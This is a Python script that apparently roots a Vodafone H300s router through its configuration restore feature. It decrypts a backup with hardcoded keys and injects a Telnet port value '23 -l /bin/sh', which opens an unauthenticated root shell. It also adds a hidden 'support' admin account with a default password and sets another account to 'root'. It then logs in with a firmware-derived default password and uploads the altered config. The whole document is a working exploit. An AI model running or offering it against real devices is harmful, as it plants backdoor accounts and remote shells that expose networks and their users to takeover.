"""Restore an H300s config carrying the documented Telnet command injection."""
import hashlib, http.client, importlib.util, json, os, re, secrets, time, getpass
from http.cookies import SimpleCookie
from pathlib import Path
from urllib.parse import urlencode
from xml.etree import ElementTree as ET
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

ROOT=Path(__file__).resolve().parent; TARGET="192.168.2.1"; IFACE=b"enp44s0\0"
SRC=Path(os.environ.get("H300S_CONFIG", str(ROOT/"unit-backups/20261112T012015Z/superuser.config")))
spec=importlib.util.spec_from_file_location("net",ROOT/"local-router-access.py"); net=importlib.util.module_from_spec(spec); spec.loader.exec_module(net)
ALPHABET=b"26aejsw37bfktx48chmuy59dipvz"; IV=b"\x83"*16
def md5(*x):
 import hashlib
 h=hashlib.md5(); [h.update(y) for y in x]; return h.digest()
def mapd(d):
 b=bytearray(33)
 for i,v in enumerate(d):
  s=f"{v:x}".encode(); p=2*i; b[p:p+len(s)]=s
  if p+len(s)<33: b[p+len(s)]=0
 return bytes(ALPHABET[x%len(ALPHABET)] for x in b[:32])
def enc(k,d):
 n=16-len(d)%16; return Cipher(algorithms.AES(k),modes.CBC(IV)).encryptor().update(d+bytes([n])*n)
class C(http.client.HTTPConnection):
 def connect(self):
  import socket
  self.sock=socket.socket(); self.sock.settimeout(self.timeout); self.sock.setsockopt(socket.SOL_SOCKET,socket.SO_BINDTODEVICE,IFACE); self.sock.connect((TARGET,80))
cookies=SimpleCookie(); cookies["login_uid"]="0."+str(secrets.randbelow(10**15)); token=""
def ck(): return "; ".join(f"{k}={v.value}" for k,v in cookies.items())
def req(method,path,body=None,ctype=None,timeout=30):
 global token
 q=urlencode({"_":int(time.time()*1000),"csrf_token":token}) if token else ""; h={"Host":TARGET,"User-Agent":"Mozilla/5.0 Chrome/130","Connection":"close","Cookie":ck()}
 if body is not None: h.update({"Content-Type":ctype or "application/x-www-form-urlencoded","Content-Length":str(len(body))})
 c=C(TARGET,timeout=timeout)
 try:
  c.request(method,path+("?"+q if q else ""),body=body,headers=h); r=c.getresponse(); d=r.read()
  for k,v in r.getheaders():
   if k.lower()=="set-cookie": cookies.load(v)
  if path in ("/login.html","/overview.html"):
   m=re.search(rb"csrf_token\s*=\s*['\"]([^'\"]+)",d)
   if m: token=m.group(1).decode()
  return r.status,d
 finally: c.close()
password=getpass.getpass("Backup password (not saved): ").encode()
raw=SRC.read_bytes(); fields=raw.split(b"\n",5); outer=mapd(md5(md5(b"b7293e8150d1330c6c3d93f2fa81331b",password),md5(b"83f323b7132703029da5f4a9daa72a60",password),md5(b"48b526aa1f0552bf3e67f94a9afd3b45",password))); hexplain=Cipher(algorithms.AES(outer),modes.CBC(IV)).decryptor().update(fields[5]); pad=hexplain[-1]; innerct=bytes.fromhex(hexplain[:-pad].decode()); inner=mapd(md5(md5(b"sErCoMm"+b"eNtry3"),md5(b"sErCoMm"),md5(b"eNtry3"))); pt=Cipher(algorithms.AES(inner),modes.CBC(IV)).decryptor().update(innerct); pt=pt[:-pt[-1]].rstrip(b"\0")
root=ET.fromstring(pt); device=next(x for x in root.iter() if x.tag=="OBJECT" and x.attrib.get("name")=="Device.")
mg=ET.SubElement(device,"OBJECT",{"name":"X_SC_Management.","type":"object","writable":"0"}); tel=ET.SubElement(mg,"OBJECT",{"name":"TelnetServer.","type":"object","writable":"0","hidden":"3"}); ET.SubElement(tel,"PARAMETER",{"name":"Enable","type":"boolean","value":"1","writable":"1"}); ET.SubElement(tel,"PARAMETER",{"name":"Port","type":"unsignedInt[0:65535]","value":"23 -l /bin/sh","writable":"1"})
lan=next(x for x in root.iter() if x.tag=="OBJECT" and x.attrib.get("name")=="LANConfigSecurity."); accounts=next(x for x in lan if x.tag=="OBJECT" and x.attrib.get("name")=="X_SC_LoginAccount.")
if not any(x.attrib.get("name")=="2." for x in accounts):
    a=ET.SubElement(accounts,"OBJECT",{"name":"2.","type":"object","writable":"0"})
    for n,v,extra in [("FullName","Tech Support",{}),("UserName","support",{}),("Password","support",{"encryption":"1"}),("DefaultPassword","support",{"hidden":"3"}),("Group","admin",{"enumeration":"user,support,admin"}),("Language","en",{}),("Permission","web,cli",{}),("AccessMode","all",{"enumeration":"lan,wan,all"}),("SetPasswordPrompt","0",{}),("DefaultPasswordAlert","1",{})]:
        attrs={"name":n,"type":"boolean" if n in ("SetPasswordPrompt","DefaultPasswordAlert") else "string","value":v,"writable":"1"}; attrs.update(extra); ET.SubElement(a,"PARAMETER",attrs)
acct3=next((x for x in accounts if x.attrib.get("name")=="3."),None)
if acct3 is not None:
    wanted={"UserName":"root","Password":"CHANGE_ME","Group":"admin","Permission":"web,cli","AccessMode":"all"}
    for n,v in wanted.items():
        p=next((x for x in acct3 if x.tag=="PARAMETER" and x.attrib.get("name")==n),None)
        if p is None: p=ET.SubElement(acct3,"PARAMETER",{"name":n,"type":"string","writable":"1"})
        p.attrib["value"]=v
xml=ET.tostring(root,encoding="utf-8")+b"\0"; ict=enc(inner,xml); hx=ict.hex().upper().encode()+b"\n"; oct=enc(outer,hx); cfg=b"\n".join(fields[:5])+b"\n"+oct
st,_=req("GET","/login.html"); assert st==200 and token; st,d=req("GET","/data/login.json"); info={k:v for row in json.loads(d) for k,v in row.items()}; ch=info["challenge"]; import hashlib as H
st,_=req("POST","/data/reset.json",b"chk_sys_busy=", "application/x-www-form-urlencoded"); assert st==200
pw=ET.parse(ROOT/"firmware-analysis/Vodafone_H_300s_v1.2.02.08/default_GR.decrypted.xml"); default=os.environ.get("H300S_PASSWORD") or next(v.get("Password") for n in pw.iter() for v in [{c.attrib.get("name"):c.attrib.get("value") for c in n}] if v.get("UserName")=="superuser"); login=urlencode({"LoginName":"superuser","LoginPWD":H.sha256((default+ch).encode()).hexdigest(),"challenge":ch}).encode(); st,d=req("POST","/data/login.json",login); assert st==200 and d.strip().strip(b'"')==b"1"; req("GET","/overview.html")
st,d=req("POST","/data/settings_configuration.json",urlencode({"ConfigurationRestoreType":"admin"}).encode()); print("restore mode",st,d[:100]); boundary="----CodexCfg"+secrets.token_hex(8); body=(f"--{boundary}\r\nContent-Disposition: form-data; name=\"uploadType\"\r\n\r\nconfig\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n102476800\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"uploadedfile\"; filename=\"h300s-telnet.config\"\r\nContent-Type: application/octet-stream\r\n\r\n").encode()+cfg+f"\r\n--{boundary}--\r\n".encode(); st,d=req("POST","/data/Backup.json",body,f"multipart/form-data; boundary={boundary}",180); print("restore upload",st,d[:300],"config_sha256",hashlib.sha256(cfg).hexdigest())
